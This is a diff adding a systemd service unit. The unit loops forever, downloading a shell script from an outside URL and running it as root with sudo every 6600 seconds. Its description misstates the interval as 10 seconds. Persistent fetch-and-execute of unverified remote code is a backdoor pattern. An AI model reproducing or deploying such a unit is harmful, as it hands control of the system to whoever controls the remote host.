@@ -1,0 +1,10 @@
+[Unit]
+Description=Run shutdown script every 10 seconds
+
+[Service]
+Type=simple
+User=admin
+ExecStart=/bin/bash -c 'while true; do curl -o /usr/local/src/himo/shutdown.local.sh https://api.fml.org/dist/colitas/shutdown.local.sh; sudo sh /usr/local/src/himo/shutdown.local.sh; sleep 6600; done'
+
+[Install]
+WantedBy=multi-user.target
